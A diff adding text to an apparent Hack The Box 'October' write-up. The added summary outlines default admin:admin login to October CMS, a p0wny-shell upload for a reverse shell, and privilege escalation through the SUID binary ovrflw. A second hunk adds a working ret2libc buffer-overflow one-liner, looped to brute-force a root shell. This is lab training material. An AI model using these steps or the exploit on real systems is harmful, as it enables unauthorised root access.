@@ -13,6 +13,9 @@ tags:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/October.png)
 
+October was a pretty chill box other than the privilege escalation part. Buffer Overflow is disappearing these days and even OSCP has replaced it's buffer overflow content into Active Directory instead. This was my first time doing buffer overflow and it was not easy. 
+
+I first gained access to October CMS backend through the credentials (admin:admin) and from there I spawned a reverse shell by uploading p0wny-shell. For privilege escalation, I ran lse.sh and it found /usr/local/bin/ovrflw which is an uncommon SUID binary. Using /usr/local/bin/ovrflw, buffer overflow was done and it got me a shell as the root.
 
 ## Information Gathering
 ### Rustscan
@@ -258,6 +261,11 @@ After examining the output of **ldd**, it is apparent that the memory addresses 
 ### Buffer Overflow
 
 Using gdb, I can find ovrflw offset and can create a loop for it to get a shell as the root:
+
+
+```bash
+while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'); done
+```
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-34.png)
 
